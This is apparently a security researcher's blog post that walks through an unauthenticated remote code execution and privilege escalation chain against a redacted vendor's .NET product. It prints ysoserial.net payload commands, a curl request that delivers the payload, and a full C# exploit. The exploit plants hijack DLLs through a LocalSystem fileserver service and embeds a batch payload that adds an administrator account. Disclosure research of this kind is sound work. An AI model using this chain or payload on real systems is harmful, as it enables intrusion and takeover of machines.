+++
title = "Open Door Policy, or How I've Let Myself In"
author = ["Frederic Linn"]
date = 2023-03-06T16:54:00+01:00
draft = false
+++

<div class="verse">

"The fear [...] was of being overwhelmed, of disintegrating under a pressure of reality greater than a mind, accustomed to living [...] in a cosy world of symbols, could possibly bear."<br />
<br />
--- Aldous Huxley, 'The Doors of Perception'<br />

</div>

If you've read anything related to information security in the past, chances are you've come across the following term:

**Attack Surface Reduction**

It's one of the first suggestions that gets thrown around for securing software.
And it makes sense: You cannot attack something that's not _there_[^fn:1]!

Reducing the surface could be done by simply removing every input from an application, but that would render it quite useless. Having a couple of choke points that can be audited thoroughly is the next best thing.

Actually mapping the attack surface is also context-dependent. We [previously](/blog/privesc-part-1) discovered a post-authentication vulnerability that allowed for `remote code execution`. Because exploitation required a valid user account, the vendor may or may not choose to include the vulnerable endpoint into _their_ attack surface.

This endpoint let us execute code like it's straight out of a `Capture the Flag` event[^fn:2], so we were gently eased into the concepts involved in exploiting a remote system end-to-end.

Additionally, our privilege escalation vector relied on misconfiguration. While this is a very frequent occurrence, it still didn't feel _quite_ right.

Like Ned Williamson stated in one of his [talks](https://www.youtube.com/watch?v=39yPeiY808w): We grow by tackling something that's _barely_ achievable. So while our previous adventures were a perfect fit for my former skill level, it's time to end this specific research journey on a high ♫:

How about we dramatically reduce the attack surface ourselves by only working with unauthenticated requests? That would certainly make for a nice challenge. Let's handicap us even further by only allowing the usage of components that are packaged into a default installation of said software. A self-sufficient exploit chain, unconcerned about the current patch level of the machine. I like it.

In this article, we're going from discovering and exploiting another initial `remote code execution` vector to escalating our privileges by abusing a powerful internal service.

By the end, we'll have taken over the machine remotely within a single `HTTP` request.


### Disclaimer {#disclaimer}

It took a while and the very severe issues presented in this article, but the vendor has finally taken some actions.
We had a couple of meetings and received status updates and I even got to talk to the developers directly. That's a lot less draining than going through management every time.

All in all, they were thankful for the findings and are actively working on fixing them.
Some things are already fixed, while others are supposedly more challenging.

It seems like their management wants to be quiet about those security issues, which is the wrong thing to do in my opinion. I'm not `Project Zero`, though, so I won't go rogue and release every detail just yet. That's why everything vendor specific remains censored.

So while it's still not time to polish my _CV_ with some _CVEs_, at least the vulnerabilities are being worked on.


### No more gatekeeping! {#no-more-gatekeeping}

How do we get an initial foothold into the server without the luxury of our friendly endpoint?

In the presence of a [file upload vulnerability](https://portswigger.net/web-security/file-upload), we could upload a `web shell` and execute commands or code that way. Maybe we find a [XXE injection vulnerability](https://portswigger.net/web-security/xxe), which in very rare cases[^fn:3] can lead to code execution.

However, our target server is written in `C#` and every uploaded file resides in a safe location outside the server's root directory, so no dice!

There's a third, very popular attack vector for executing custom code: [Insecure Deserialization](https://portswigger.net/web-security/deserialization).

In order to understand the issue, let's quickly define what serialization even means:

_Serilization is the process of transforming data structures or objects with internal state into a format that can be stored or transmitted easily._

Or for you diagram loving people:

<svg viewBox="0 0 740 200" width="740" height="200" version="1.1"><defs id="edraw-org514d89d-defs"><marker markerWidth="6" markerHeight="6" viewBox="0 0 10 10" refX="5" refY="5" orient="auto" stroke="none" fill="#999" id="edraw-org514d89d-def-0-arrow"><path d="M0,1.5 0,8.5 7.0,5Z" /></marker></defs><rect fill="#f8f8f8" id="edraw-org514d89d-background" x="0" y="0" width="740" height="200" /><g id="edraw-org514d89d-body"><rect stroke="none" fill="#d33682" rx="10" ry="10" x="20" y="40" width="120" height="140" /><ellipse stroke="none" fill="rgba(0,0,0,0.3098)" cx="360" cy="110" rx="80" ry="70" /><path stroke="#999" stroke-width="4" fill="none" d="M140,180" /><path stroke="#999" stroke-width="4" fill="none" d="M140,180" /><text x="360" y="80" font-family="sans-serif" font-size="18" text-anchor="middle" fill="#222">10001110</text><text x="360" y="120" font-family="sans-serif" font-size="18" text-anchor="middle" fill="#222">10001110</text><text font-family="sans-serif" font-size="18" text-anchor="middle" fill="#222" x="360" y="140">00101001</text><text x="360" y="100" font-family="sans-serif" font-size="18" text-anchor="middle" fill="#222">00101001</text><text font-family="sans-serif" font-size="18" text-anchor="start" fill="#222" x="40" y="80">User {</text><text font-family="sans-serif" font-size="18" text-anchor="start" fill="#222" x="60" y="100">id=3</text><text font-family="sans-serif" font-size="18" text-anchor="start" fill="#222" x="60" y="140">age=69</text><text font-family="sans-serif" font-size="18" text-anchor="start" fill="#222" x="60" y="120">lang=en</text><text font-family="sans-serif" font-size="18" text-anchor="start" fill="#222" x="40" y="160">}</text><rect x="600" y="40" width="120" height="140" rx="10" ry="10" fill="#d33682" stroke="none" /><text x="620" y="80" font-family="sans-serif" font-size="18" text-anchor="start" fill="#222">User {</text><text x="640" y="100" font-family="sans-serif" font-size="18" text-anchor="start" fill="#222">id=3</text><text x="640" y="120" font-family="sans-serif" font-size="18" text-anchor="start" fill="#222">lang=en</text><text x="640" y="140" font-family="sans-serif" font-size="18" text-anchor="start" fill="#222">age=69</text><text x="620" y="160" font-family="sans-serif" font-size="18" text-anchor="start" fill="#222">}</text><text font-family="sans-serif" font-size="18" text-anchor="middle" fill="#222" x="200" y="140">Serialization</text><text font-family="sans-serif" font-size="18" text-anchor="middle" fill="#222" x="520" y="140">Deserialization</text><text font-family="sans-serif" font-size="18" text-anchor="middle" fill="#222" x="80" y="20">Client</text><text font-family="sans-serif" font-size="18" text-anchor="middle" fill="#222" x="360" y="20">Network</text><text font-family="sans-serif" font-size="18" text-anchor="middle" fill="#222" x="660" y="20">Server</text><path stroke="#999" stroke-width="4" fill="none" d="M140,180" /><path stroke="#999" stroke-width="4" fill="none" d="M140,180" /><path stroke="#999" stroke-width="4" fill="none" d="M140,180" /><path stroke="#999" stroke-width="4" fill="none" d="M140,180" /><path stroke="#999" stroke-width="4" fill="none" d="M140,100C140,100 140,100 140,100L140,100L140,100L140,100L140,100L160,100L160,100L160,100L160,100L160,100L160,100L160,100L160,100L160,100L160,100L180,100L180,100L180,100L180,100L180,100L180,100L180,100L200,100L200,100L200,100L200,100L200,100L200,100L200,100L200,100L200,100L200,100L220,100L220,100L220,100L220,100L240,100L240,100L240,100L240,100L260,100L260,100L260,100L260,100L260,100L260,100L260,100L280,100C280,100 280,100 280,100" marker-end="url(#edraw-org514d89d-def-0-arrow)" /><path stroke="#999" stroke-width="4" fill="none" d="M440,180" /><path stroke="#999" stroke-width="4" fill="none" d="M440,180" /><path stroke="#999" stroke-width="4" fill="none" d="M440,100C440,100 440,100 440,100L440,100L460,100L460,100L460,100L480,100L480,100L480,100L500,100L500,100L500,100L500,100L500,100L500,100L520,100L520,100L520,100L560,100L560,100L560,100L560,100L580,100L580,100L580,100L580,100L580,100L580,100L580,100L580,100L580,100L580,100L580,100L580,100L600,100L600,100C600,100 600,100 600,100" marker-end="url(#edraw-org514d89d-def-0-arrow)" /></g></svg>

An object with internal state gets serialized into some common format and...

**HOLD ON**!

That serialized object becomes the input of some deserializing function down the line. _Any_ input is bad news, as every self-respecting and more importantly self-proclaimed information security specialist knows.

But what can _actually_ go wrong?


#### Exploiting Insecure Deserialization {#exploiting-insecure-deserialization}

I don't remember if I heard about this vector while binge watching security conference talks, or if it came up during my own research into `RCE` in web applications. In any case, there's one talk that had a huge impact: [Attacking .NET deserialization](https://www.youtube.com/watch?v=eDfGpu3iE4Q) by Alvaro Muñoz.

The talk does an exceptional job of explaining the details, so I'm not even going to bother.

Moreover, the author also released the [YSoSerial.Net](https://github.com/pwntester/ysoserial.net) tool that can generate a multitude of different payloads depending on the target.
What's a target? There are numerous classes that can handle the deserialization, so every one of those might be a different target.

Deserialization exploitation also has the concepts of `gadgets`[^fn:4], which are types with methods that get invoked during the deserialization process. Those invocations can lead to malicious behavior when controlled correctly.

Some gadgets may or may not be available to our application, depending on the environment. Combining multiple gadgets into a whole chain can result into custom code execution.

This seems rather brittle, but two things are important here:

1.  The actual payload can be generated with `YSoSerial.Net`.
2.  We know what formatters to look for (`LosFormatter`, `SoapFormatter`, `BinaryFormatter`...)

Armed with this knowledge, let's go find us some vulnerable formatter!


#### Hunting the Illusive Formatter {#hunting-the-illusive-formatter}

Knowing what kind of formatters to look for, the analysis becomes almost trivial with the program at hand. Now it's only a matter of decompiling it and its libraries with our favorite `.NET` decompiler and looking through the results.

I've came across the infamous `BinaryFormatter` pretty quickly. Microsoft has a dedicated [site](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide) that explains deserialization risks in general. The `BinaryFormatter` spearheads that list, that's how infamous it is!

The documentation states:

> The BinaryFormatter type is dangerous and is not recommended for data processing.
> Applications should stop using BinaryFormatter as soon as possible,
> even if they believe the data they're processing to be trustworthy.
> BinaryFormatter is insecure and can't be made secure.

One person's security nightmare is the other person's dream come true!

Now that we've verified the existence of the `BinaryFormatter` in the program, the much more important question becomes:

Can we actually reach it with an unauthenticated request?

That part took way longer than expected. For starters, the code base is **enormous**. Interfaces upon interfaces, the most indirect indirection imaginable. I wouldn't make my arch-nemesis draw a fucking `UML` diagram of that mess[^fn:5]!

Tracing the input backwards from the `BinaryFormatter` is virtually impossible, because all those indirections kill the decompiler's "Used By" function.

Fed up with the bullshit, I've decided to switch things up by _dynamically_ analyzing the program.

No matter how many times I'm attaching a debugger to a running process, I'm always fascinated. Hopefully that feeling never goes away!

So here we are, repeatedly making requests to various known endpoints while simultaneously trying to set break points earlier and earlier into the request handling code.

After what seems like a lifetime, I noticed other code paths that reference this endpoint:

`/native/<redacted>/anonymous/`

Looking at it, this endpoint seems _highly_ suspicious 🥸. Naturally, it's not mentioned anywhere.


#### An Emotional 🎢 {#an-emotional}

After being ecstatic about the finding, doubts started to creep in:

They use their own wrapper class around the `BinaryFormatter`. Maybe they do some sanitization in there? How do I even deliver the payload?

I'll spare you most of the tedious details, but it took quite a lot of experimenting. There were so many moving parts that I had trouble to isolate the problems. A few highlights:

Choosing the right gadget chain. How do I even know which gadgets are "in the class path"?

Letting `YSoSerial.Net` generate a Base64 encoded payload, because the raw binary one didn't work. Afterwards I've had to use [CyberChef](https://gchq.github.io/CyberChef/) to _decode_ that payload and save it to a file. Why the intermediary step? Because computers!

How do I put the binary file into the body of the request so that it doesn't get messed with?

I tested some steps in demo programs and at some point even hot-patched the running application with the help of [dnSpy](https://github.com/dnSpy/dnSpy).
All in all a pretty amazing way for learning new techniques, but also quite tiring.

The icing on the 🎂, however, was my `calc` popping proof of concept. As is tradition for exploits, starting the calculator app is proof of code execution on a machine.

**Not a single fucking calculator popped!**

Right at the brink of insanity, I checked within the `Task-Manager` and saw dozens of `calc.exe` processes:

{{< figure src="/privesc-3-calc.png" caption="<span class=\"figure-number\">Figure 1: </span>Traditional proof of exploitability" >}}

In hindsight it's obvious: Inside the VM, I was logged in as admin. The `IIS Appool\<appname>` user that executes our code, however, doesn't have access to my desktop. So while the process _does_ get started, it doesn't show up on _my_ desktop.

Allow me to share my notes from the time to highlight just _how_ happy I was:

> I think it works. I actually think it works! [It] fucking _does_ show it pops! YEEE[...]EEEAH!

I can still feel the rush!

Here's the final command for generating the calculator payload. Except for the gadget, it was taken straight from the [example section](https://github.com/pwntester/ysoserial.net#examples) in `YSoSerial.Net's` readme.

```sh
 $ ./ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "calc" -t
```

Most of the `YSoSerial` gadgets let you specify a command like that. But how do we actually run custom _code_?

Honestly, it took me a while to find out. But reading the output of `--fullhelp` carefully, we can see this:

```sh { linenos=true, linenostart=1, hl_lines=["6"] }
$ ./ysoserial.exe --fullhelp
ysoserial.net generates deserialization payloads for a variety of .NET formatters.

== GADGETS ==
# ... snip ...
        (*) ActivitySurrogateSelector [This gadget ignores the command parameter and executes the constructor of ExploitClass class]
                Formatters: BinaryFormatter (2) , LosFormatter , SoapFormatter
# ... snip ...
```

Line 6 mentions the `ExploitClass`, which is part of the repository. The constructor of that class is the place where we write our code. After building the project and executing the following command, we receive our custom code payload.

```sh
 $ ./ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -c -o base64
```

Even though the `command` parameter is ignored, the `-c` flag **must** be specified!

Finally, let's send our payload to the server in a way that doesn't mess with the bits and bytes:

```sh
 $ curl -X POST --data-binary "@./OpenDoorPolicy-PoC.bin" http://<hostname>/<redacted>/<redacted>/<redacted>/native/<redacted>/anonymous/ --output - -v
```

Oh my, that was a lot of work to get another initial attack mounted. We're not even half done here, though:

Our code only runs in the context of the `IIS Apppool\<appname>` user. We need _some_ way to further escalate privileges. So what exactly do we put into the payload? Wanting to stay inside the vendor's ecosystem, what options do we have available?


### Fileserver {#fileserver}

Introducing the `Fileserver` (`FS`), which is responsible for handling... exactly.

It's the only `Windows` service left that runs by default in the newest version of the product. Oh, it also runs as [LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account), which makes it a perfect target.

Why they need an extra service to handle files is beyond me. There's also some caching going on with multiple of those services distributed across machines, but it's not the default setup. Probably it's just a legacy thing for the GUI app in order to directly talk _to_ it.

Actually I've already talked _about_ it in the first article of this series. We exploited this very service by planting two DLLs next to it with a technique called [DLL Proxying](/blog/privesc-part-1#dll-hijacking).

This time, however, the `FS` binary is located in a restricted location (`C:\Program Files (x86)\`), which is actually the default path. We cannot access it with our `IIS Appool` user.

Consequently, we are not able to simply drop our `DLLs` from within the deserialization code that gets run in the context of said user.

If only there was a service that allowed us to write files to arbitrary locations...

**HOLD ON**!

Maybe we can use the `FS` itself to do the deed?

At this point, I've had many questions:

-   How does communication with the `FS` work?
-   Is there some form of authentication?
-   Am I a [wizard](https://i.kym-cdn.com/photos/images/original/000/117/814/are-you-wizard.jpg)?


#### Overanalyzing the Fileserver {#overanalyzing-the-fileserver}

Alright, let's take this one step at a time. What are our options? We could throw the binary into a disassembler, capture and analyze any communication traffic or even attach a debugger to the running process.

Let's start small, though, by simply running the binary manually inside a test VM. The help menu helpfully informs us about the presence of a debug mode, which instructs the program to print many interesting things to the console at runtime.

The first thing we see after starting is that the listening port is already taken. After shutting down the service instance of the binary, it works. We get informed that the program listens on port 7600.

Cool, but what does it listen for? HTTP requests?

This right here is not your sophisticated `microservice` class, so hold your containers! It's simply listening for `TCP` connections in order to send and receive the raw bytes that constitute its custom protocol. How do I know, you ask? Well, let's dive into dynamic analysis, specifically capturing and analyzing network traffic.

We start a capture session from within the wonderful `WireShark` and use the vendor's GUI client to upload a file. We stop the capture immediately to reduce noise.

Did we catch something of interest? We know the destination port, so we could use it as a filter. But because there's not much going on in my test VM, we simply take the first `TCP` stream:

{{< figure src="/privesc-3-fileserver-handshake.png" caption="<span class=\"figure-number\">Figure 2: </span>Dirty Talk: \"@#I\"" >}}

I didn't know at the time, but the `@#I` means "Let's talk binary" and is part of the initial handshake.

Even though there's not much going on inside the VM, its still extremely useful to only focus on a specific conversation. We can achieve this by _following the stream_ inside `WireShark`:

{{< figure src="/privesc-3-fileserver-follow-stream.png" caption="<span class=\"figure-number\">Figure 3: </span>The whole stream of consciousness" >}}

The red lines are requests by the client and the blue lines are responses by the `FS`. I've marked some interesting byte patterns in yellow.

Even without reading [Attacking Network Protocols](https://nostarch.com/networkprotocols), it's a safe bet that the beginning of each request/response is some sort of command identifier. Take the first one for example, which is the little endian representation of `0x3e8`. We'll demystify it in a second.

If those bytes really _are_ commands, we can probably find a giant switch statement inside the disassembled binary. Wait, do we even need to disassemble it?

Is it a `.NET` assembly written in `C#`? This would mean we can throw it in our favorite `.NET` decompiler and get a beautiful decompilation.

Or is it a native binary written in something like `C/C++`? In that case, we really need to disassemble it with our favorite disassembler.

Let's find out:

```sh { linenos=true, linenostart=1, hl_lines=["2"] }
$ file fsserver.exe
fsserver.exe: PE32 executable (console) Intel 80386, for MS Windows, 4 sections
```

So disassembling it is!

I spent quite a few hours looking at the binary. I'm a bloody beginner when it comes to reversing, but it's just **so** much fun. That whole binary reversing/exploitation topic still has such a strong _allure_, even though I've mainly been looking at higher-level web and `.NET` things in the past.

Anyway, the binary contains plenty of interesting strings, but no symbols. After looking around for a while, I found the `HandleCommand` function (named by myself):

{{< figure src="/privesc-3-fileserver-ghidra.png" caption="<span class=\"figure-number\">Figure 4: </span>The Fileserver binary in Ghidra" >}}

Look at that beautiful sight. There's nothing more soothing than slowly reversing a binary...

**HOLD ON**!

While it's nice to get to know the binary from different angles, what's the actual endgame here?

Let's weigh our options. We could check

-   how every size argument for `memcpy()` is calculated.
-   how user input flows into string formatting functions.
-   how heap objects are managed (`heap overflow`, `double free`)

With some elbow grease, we could even write a custom fuzzer that does some of that work for us.

I'm positive that we'd find plenty of things! But then what? There's simply **no way** I'm going to be able to actually _exploit_ those vulnerabilities on a modern system with my current abilities.

I've got sidetracked quite a bit by the aforementioned allure of binary exploitation, but remember:

<div class="verse">

"If only there was a service that allowed us to write files to arbitrary locations."<br />
--- Myself, 'Open-Door Policy, or How I've Let Myself In'<br />

</div>

Let's be smart about this! We don't need to exploit memory corruption. We only need to exploit the intended behavior of the service!

Can't we simply issue commands to the `FS` and plant our malicious files that way?


#### Serving Files as God Intended {#serving-files-as-god-intended}

At first I wanted to write my own `FS` client based on the reversing work done previously. But again: Let's be smart about this. The vendor must have a way of talking to it, too. Right?

Right! And I've stumbled over it before without paying too much attention: The `Fileserver.Client DLL`. It gets installed into the `Global Assembly Cache` ([GAC](https://learn.microsoft.com/en-us/dotnet/framework/app-domains/gac)) automatically by the vendor.

Finally it's the `.NET` decompiler's time to shine:

{{< figure src="/privesc-3-fileserver-commands.png" caption="<span class=\"figure-number\">Figure 5: </span>An excerpt of all the possible commands" >}}

Oh look, there's our `0x3e8` from above, but decimal:

```python { linenos=true, linenostart=1 }
command = 0x3e8
print("decimal: ", int(command))
```

```text
decimal:  1000
```

Cool, so those bytes correspond to the `Initialize` command. Makes sense, right?

At this point we're not really interested in the details any more, because the library provides us with much higher-level functions like `Connect()` and `WriteFile()`.

We still don't know if there's an authentication mechanism in place, so let's write a small demo program. We're going to execute it directly on the server in order to eliminate all the uncertainties of the deserialization process.

After creating a `.NET Framework` console application and specifying the `Fileserver.Client DLL` as a dependency manually, our editor of choice is able to give us that `IntelliSense` goodness.

Writing the program is straightforward. But does it actually allow us to write files in forbidden places?

I'll save us both the bandwidth by leaving out a screenshot showing a hilariously-named file in a folder, but it **absolutely works**! That's a very important stepping stone on our way to glory.

There is, however, a problem. You see, we specified the `DLL` as a dependency in our project in order to get a hold of those nice types.

So what's the problem?

Dependency management is complicated, not only in the [.NET](https://learn.microsoft.com/en-us/dotnet/standard/library-guidance/dependencies) world. Our referenced `DLL` has a specific version. But another version of that `DLL` could be on the server, which _might_ break our exploit. So in order to stay as generic as possible, we need another way of calling those functions.

Thankfully, we already used one of the nicest `.NET` features [extensively](/blog/privesc-part-2): Our good old friend `Reflection`.

If our previous adventures taught us anything, it's that the `Reflection` system is extremely useful in restricted environments. In the end, everything comes down to string-matching.

Granted, that sounds horrible!
But it's the only way we can build a dependency-free[^fn:6] `.NET` assembly while still making use of the already existing `Fileserver.Client DLL`.


### Recipe for Disaster {#recipe-for-disaster}

With all that out of the way, how does the full exploit chain look like?

1.  Trigger deserialization vulnerability.
2.  Load `Fileserver.Client DLL` from the `GAC`.
3.  Send commands to the `FS` in order to plant our malicious files next to the binary itself.
4.  Create a new connection to the `FS`, which forks the process, loads our `DLLs` and executes our batch script.
5.  🎉🥳🎉

Here's the final exploit for reference:

```C { linenos=true, linenostart=1 }
/*
 .d88888b.                         8888888b.                        8888888b.         888d8b
d88P" "Y88b                        888  "Y88b                       888   Y88b        888Y8P
888     888                        888    888                       888    888        888
888     88888888b.  .d88b. 88888b. 888    888 .d88b.  .d88b. 888d888888   d88P .d88b. 888888 .d8888b888  888
888     888888 "88bd8P  Y8b888 "88b888    888d88""88bd88""88b888P"  8888888P" d88""88b888888d88P"   888  888
888     888888  88888888888888  888888    888888  888888  888888    888       888  888888888888     888  888
Y88b. .d88P888 d88PY8b.    888  888888  .d88PY88..88PY88..88P888    888       Y88..88P888888Y88b.   Y88b 888
 "Y88888P" 88888P"  "Y8888 888  8888888888P"  "Y88P"  "Y88P" 888    888        "Y88P" 888888 "Y8888P "Y88888
           888                                                                                           888
           888                                                                                      Y8b d88P
           888                                                                                       "Y88P"
                                                                                                              ---GEBIRGE (2022)
*/

using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Threading;

class E
{
    private const string PROXY_DLL = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAA<and so on>";
    private const string VERSION_DLL = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAA<and so on>";
    private const string PAYLOAD = "bmV0IHVzZXIgcHduZWQgcHduZWQgL2FkZApuZXQgbG9jYWxncm91cCBBZG1pbmlzdHJhdG9yZW4gcHduZWQgL2FkZAo=";

    public E()
    {
        // We make assumptions about the path, instead of querying something like WMI.
        var servicePath = string.Empty;
        var possibleServicePaths = new[]
        {
            @"C:\Program Files (x86)\<redacted>\fsserver.exe",
            @"D:\<redacted>\fsserver.exe",
        };

        var fsAssembly = Assembly.LoadWithPartialName("<redacted>.Fileserver.Client");

        if (fsAssembly == null) {
            // Sleeping for different amounts of time in order to leak the exact error.
            Thread.Sleep(1000*3);
            return;
        }

        var fsClientType = fsAssembly.GetType("<redacted>.Fileserver.Client.FileserverClient");
        var constructor = fsClientType.GetConstructor(Type.EmptyTypes);

        if (constructor == null) {
            Thread.Sleep(1000*5);
            return;
        }

        // Create a new instance of FileserverClient and retrieve some of its methods.
        var fsClient = constructor.Invoke(null);
        var connectMethod = fsClientType.GetMethod("Connect", Type.EmptyTypes);
        var writeFileMethod = fsClientType.GetMethod("WriteFile", new[] { typeof(string), typeof(Stream) });
        var deleteFileMethod = fsClientType.GetMethod("DeleteFile", new[] { typeof(string) });
        var disposeMethod = fsClientType.GetMethod("Dispose", Type.EmptyTypes);

        if (connectMethod == null || writeFileMethod == null || disposeMethod == null || deleteFileMethod == null) {
            Thread.Sleep(1000*7);
            return;
        }

        var connected = (bool) connectMethod.Invoke(fsClient, null);
        if (!connected) {
            Thread.Sleep(1000*9);
            return;
        }

        foreach (var path in possibleServicePaths) {
            if (File.Exists(path)) {
                servicePath = path;
            }
        }

        if (string.IsNullOrEmpty(servicePath)) {
            Thread.Sleep(1000*11);
            return;
        }

        var directoryName = Path.GetDirectoryName(servicePath);

        // Convert DLLs and batch file to streams and write them to the appropriate locations.
        var proxyStream = new MemoryStream(Convert.FromBase64String(PROXY_DLL));
        var origStream = new MemoryStream(Convert.FromBase64String(VERSION_DLL));
        var payloadStream = new MemoryStream(Convert.FromBase64String(PAYLOAD));

        var filesToDelete = new List<string>();

        var writePath = Path.Combine(directoryName, "version.dll");
        writeFileMethod.Invoke(fsClient, new object[] { writePath, proxyStream });
        filesToDelete.Add(writePath);

        writePath = Path.Combine(directoryName, "version_orig.dll");
        writeFileMethod.Invoke(fsClient, new object[] { writePath, origStream });
        filesToDelete.Add(writePath);

        writePath = "C:\\Windows\\Temp\\payload.bat";
        writeFileMethod.Invoke(fsClient, new object[] { writePath, payloadStream });
        filesToDelete.Add(writePath);

        proxyStream.Dispose();
        origStream.Dispose();
        payloadStream.Dispose();
        disposeMethod.Invoke(fsClient, null);

        // We reconnect in order to spawn a new process, which loads our malicious proxy DLL.
        connected = (bool) connectMethod.Invoke(fsClient, null);
        disposeMethod.Invoke(fsClient, null);

        // We wait half a second to make sure the code in our proxy DLL actually ran.
        Thread.Sleep(500);

        // Deleting without reconnecting would fail, as the DLLs are currently loaded
        // by the process that got created when we made our previous connection.
        connected = (bool) connectMethod.Invoke(fsClient, null);
        foreach (var path in filesToDelete) {
            deleteFileMethod.Invoke(fsClient, new object[] { path });
        }

        disposeMethod.Invoke(fsClient, null);
    }
}
```

Doesn't look too fancy, now does it? Just about 100 lines of imperative, reflection-heavy code.


### Demo {#demo}

Some of the most anticlimactic things to watch are demos of actually _launching_ an exploit:

```sh { linenos=true, linenostart=1 }
$ python exploit.py
[+] Calculate address offset. . .
[+] Found correct offset at 0xbabebabe
[+] Allocate dummy heap objects
[+] Launch second stage
$ whoami
root
```

Why even bother, right?

Well, here's my take on the situation:

<video controls preload="metadata"><source src="/OpenDoorPolicy.mp4" type="video/mp4">
Your browser does not support the video tag.</video>

No, I did _not_ spend several hours making that video on an original `Windows XP SP2` system. Even if I _did_: You can't tell me how to live my life!


### Conclusion {#conclusion}

I'm so happy. I truly am.

After **a lot** of work, finally some security work to be _extra_ proud of!

The presented vulnerabilities in isolation are pretty standard fare. Deserialization issues, an all-mighty service without authentication, susceptibility to `DLL Hijacking`, wrong assumptions.

But it's the sum that makes them greater. That's exactly the current state of exploitation as a whole: You'd be hard pressed to find single vulnerabilities that lead to a desired outcome. Most of the time, chaining them is the only way to do something meaningful.

Another thing of note: Even though `binary exploitation` is the ever beckoning final tier in information security, we didn't need _any_ of it. Pure `logic bugs` allowed us to do everything we could've hoped for.

And because we restricted ourselves to the vendor's ecosystem, it didn't even matter how the hosting system was patched and configured. Furthermore, we only used the system _as intended_[^fn:7], so I imagine it'll be rather difficult to detect the attack. That's a really scary prospect, in my opinion!

As always: If you have any questions, suggestions or simply the desire to get in touch, feel free to [holla at me](/about).

Thank you so much for reading!


### Acknowledgments {#acknowledgments}

-   Alvaro Muñoz for the aforementioned [talk](https://www.youtube.com/watch?v=eDfGpu3iE4Q) and the ysoserial.net tool.
-   Markus Wulftange for his research on [Bypassing .NET Serialization Binders](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html), a recent addition to `.NET` serialization vulnerabilities.
-   OnlyAfro for making the _legendary_ [HE'S BACK](https://www.youtube.com/watch?v=oyA8odjCzZ4) video. Matching their editing skills is a life-long endeavor.
-   Excision &amp; Downlink for their track "Existence VIP", which is the perfect fit for _hardcore_ exploitation demos.
-   The person who archived a `Windows XP SP2` VM image :^).

[^fn:1]: It gets a bit murky if new functionality is created by [jumping into the middle of an instruction](https://devblogs.microsoft.com/oldnewthing/20220111-00/?p=106144), though.
[^fn:2]: Which is exactly why I've put two challenges inspired by it straight _into_ a `CTF`: [Here](https://github.com/LosFuzzys/GlacierCTF2022/tree/main/web/rce_as_a_service_stage1) and [here](https://github.com/LosFuzzys/GlacierCTF2022/tree/main/web/rce_as_a_service_stage2).
[^fn:3]: The PHP `expect` module has to be loaded.
[^fn:4]: In contrast to `ROP` Gadgets, these are actually bigger than a couple of bytes.
[^fn:5]: I'm explicitly **not** dunking on the developers! Stuff simply accumulates over time.
[^fn:6]: We have a **ton** of dependencies, but only to the [Base Class Library](https://learn.microsoft.com/en-us/dotnet/standard/glossary#bcl).
[^fn:7]: Making a HTTP request (granted: it throws an exception), manipulating files like the legitimate program does.
